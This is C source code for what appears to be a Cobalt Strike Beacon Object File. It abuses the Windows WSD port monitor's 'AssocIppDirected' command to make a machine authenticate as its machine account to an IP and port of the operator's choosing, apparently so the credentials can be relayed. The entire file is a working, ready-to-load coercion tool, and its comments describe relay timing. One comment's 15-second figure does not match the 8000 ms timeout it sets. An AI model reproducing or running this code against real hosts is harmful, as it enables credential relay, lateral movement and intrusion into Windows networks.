/*
 * coerceipp.c - a Beacon Object File that forces Windows machine-account
 * authentication (HOSTNAME$) by abusing the WSD port monitor's
 * "AssocIppDirected" configuration command.
 *
 * The sequence mirrors what printui.exe does for "Add a printer using an
 * IP address or hostname" with an ipp:// URI - but headless.
 *
 * Developed from behavioral reproduction of printui.exe with Claude Opus 5.5
 */

#include <windows.h>
#include <winspool.h>
#include <beacon.h>

/* DFR - the three kernel32 exports get resolved by Beacon itself */
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

/* everything else via GetProcAddress */
typedef BOOL      (WINAPI *tOpenPrinterW)(PWSTR, PHANDLE, PRINTER_DEFAULTSW *);
typedef BOOL      (WINAPI *tClosePrinter)(HANDLE);
typedef BOOL      (WINAPI *tXcvDataW)(HANDLE, PCWSTR, PBYTE, DWORD, PBYTE, DWORD, PDWORD, PDWORD);
typedef HANDLE    (WINAPI *tCreateThread)(LPVOID, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD     (WINAPI *tWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL      (WINAPI *tCloseHandle)(HANDLE);
typedef BOOL      (WINAPI *tTerminateThread)(HANDLE, DWORD);
typedef DWORD     (WINAPI *tGetLastError)(VOID);

/* generous leash: typical relay runs finish in ~6 s; only unreachable
 * hosts or a wedged spooler should still be holding the thread at 15 s */
#define ASSOC_TIMEOUT_MS  8000
#define XCV_MONITOR_NAME   L",XcvMonitor WSD Port"

#ifndef SERVER_ACCESS_ADMINISTER
#define SERVER_ACCESS_ADMINISTER 0x0001
#endif

typedef struct {
    tXcvDataW XcvDataW;
    HANDLE    hXcv;
    wchar_t  *uri;
    DWORD     cbIn;
    DWORD     needed;
    DWORD     status;
    DWORD     err;
    BOOL      ok;
} XCVJOB;

/* transient context for the worker thread */
typedef struct {
    tCreateThread        CreateThread;
    tWaitForSingleObject WaitForSingleObject;
    tCloseHandle         CloseHandle;
    tTerminateThread     TerminateThread;
    tOpenPrinterW        OpenPrinterW;
    tClosePrinter        ClosePrinter;
    tXcvDataW            XcvDataW;
    tGetLastError        pGetLastError;
} API;

static API api;

/* XcvDataW has no timeout of its own - run it on a leashed worker thread.
 * Auth is forced when spoolsv opens the connection, which happens long
 * before the association completes, so cutting the wait short is safe. */
static DWORD WINAPI xcv_worker(LPVOID param)
{
    XCVJOB *job = (XCVJOB *)param;
    job->ok = api.XcvDataW(job->hXcv, L"AssocIppDirected",
                           (PBYTE)job->uri, job->cbIn,
                           NULL, 0, &job->needed, &job->status);
    job->err = api.pGetLastError();
    return 0;
}

/* --- tiny wide-string helpers, no CRT --- */
static wchar_t *str_append_a(wchar_t *dst, const char *src)
{
    while (*src) *dst++ = (wchar_t)(unsigned char)*src++;
    return dst;
}

static wchar_t *str_append_w(wchar_t *dst, const wchar_t *src)
{
    while (*src) *dst++ = *src++;
    return dst;
}

static wchar_t *str_append_port(wchar_t *dst, int port)
{
    wchar_t tmp[8];
    int i = 0;
    do { tmp[i++] = (wchar_t)(L'0' + port % 10); port /= 10; } while (port);
    while (i) *dst++ = tmp[--i];
    return dst;
}

void go(char *args, int alen)
{
    datap         parser;
    char         *ip;
    int           port;
    wchar_t       uri[512];
    wchar_t      *p;
    DWORD         cbIn;
    HANDLE        hServer = NULL, hXcv = NULL, hThread = NULL;
    HMODULE       k32, ws;
    XCVJOB        job;
    PRINTER_DEFAULTSW pdServer = { NULL, NULL, READ_CONTROL };
    PRINTER_DEFAULTSW pdXcv    = { NULL, NULL, SERVER_ACCESS_ADMINISTER };

    /* --- parse arguments --- */
    BeaconDataParse(&parser, args, alen);
    ip   = BeaconDataExtract(&parser, NULL);
    port = BeaconDataInt(&parser);

    if (!ip || !ip[0] || port <= 0 || port > 65535) {
        BeaconPrintf(CALLBACK_OUTPUT, "[?] Usage: coerce-ipp <ip> <port>");
        return;
    }

    /* --- build ipp://<ip>:<port>/ipp/print --- */
    p = str_append_w(uri, L"ipp://");
    p = str_append_a(p, ip);
    *p++ = L':';
    p = str_append_port(p, port);
    p = str_append_w(p, L"/ipp/print");
    *p = L'\0';
    cbIn = (DWORD)((p - uri + 1) * sizeof(wchar_t));

    /* --- resolve APIs at runtime --- */
    k32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if (!k32 ||
        !(api.pGetLastError        = (tGetLastError)KERNEL32$GetProcAddress(k32, "GetLastError")) ||
        !(api.CreateThread         = (tCreateThread)KERNEL32$GetProcAddress(k32, "CreateThread")) ||
        !(api.WaitForSingleObject  = (tWaitForSingleObject)KERNEL32$GetProcAddress(k32, "WaitForSingleObject")) ||
        !(api.CloseHandle          = (tCloseHandle)KERNEL32$GetProcAddress(k32, "CloseHandle")) ||
        !(api.TerminateThread      = (tTerminateThread)KERNEL32$GetProcAddress(k32, "TerminateThread"))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to resolve kernel32 exports");
        return;
    }

    ws = KERNEL32$GetModuleHandleA("winspool.drv");
    if (!ws) ws = KERNEL32$LoadLibraryA("winspool.drv");
    if (!ws ||
        !(api.OpenPrinterW = (tOpenPrinterW)KERNEL32$GetProcAddress(ws, "OpenPrinterW")) ||
        !(api.ClosePrinter = (tClosePrinter)KERNEL32$GetProcAddress(ws, "ClosePrinter")) ||
        !(api.XcvDataW    = (tXcvDataW)KERNEL32$GetProcAddress(ws, "XcvDataW"))) {
        /* deliberately not freeing ws - may be shared/pre-existing */
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to resolve winspool.drv exports");
        return;
    }

    /* --- local print server handle --- */
    if (!api.OpenPrinterW(NULL, &hServer, &pdServer)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenPrinterW(server) failed: %lu", api.pGetLastError());
        return;
    }

    /* --- WSD port-monitor config handle --- */
    if (!api.OpenPrinterW((PWSTR)XCV_MONITOR_NAME, &hXcv, &pdXcv)) {
        DWORD e = api.pGetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenPrinterW(%ls) failed: %lu%s",
                     XCV_MONITOR_NAME, e, e == ERROR_ACCESS_DENIED ? " (run elevated)" : "");
        api.ClosePrinter(hServer);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[i] Triggering IPP association: %ls", uri);

    job.XcvDataW = api.XcvDataW;
    job.hXcv     = hXcv;
    job.uri      = uri;
    job.cbIn     = cbIn;
    job.needed   = 0;
    job.status   = 0;
    job.err      = 0;
    job.ok       = FALSE;

    /* --- fire the association, leashed to a worker thread --- */
    hThread = api.CreateThread(NULL, 0, xcv_worker, &job, 0, NULL);
    if (!hThread) {
        xcv_worker(&job);   /* no thread budget - run inline, no timeout */
    } else if (api.WaitForSingleObject(hThread, ASSOC_TIMEOUT_MS) != WAIT_OBJECT_0) {
        /* auth was already forced on connection - stop waiting */
        api.TerminateThread(hThread, 0);
        api.WaitForSingleObject(hThread, INFINITE);
        api.CloseHandle(hThread);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] %d seconds hit - spooler still associating (auth already forced)",
            ASSOC_TIMEOUT_MS / 1000);
        /*
         * The thread died inside XcvDataW. Touching the winspool handles
         * from here risks a hang, so leak them deliberately.
         */
        return;
    } else {
        api.CloseHandle(hThread);
    }

    if (job.ok && job.status == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Host responded");
    else if (job.ok)
        /* normal against a non-printer listener: auth happens, association then fails */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Target contacted - machine auth should be inbound (status %lu)", job.status);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Association failed (error %lu)", job.err);

    api.ClosePrinter(hXcv);
    api.ClosePrinter(hServer);
}
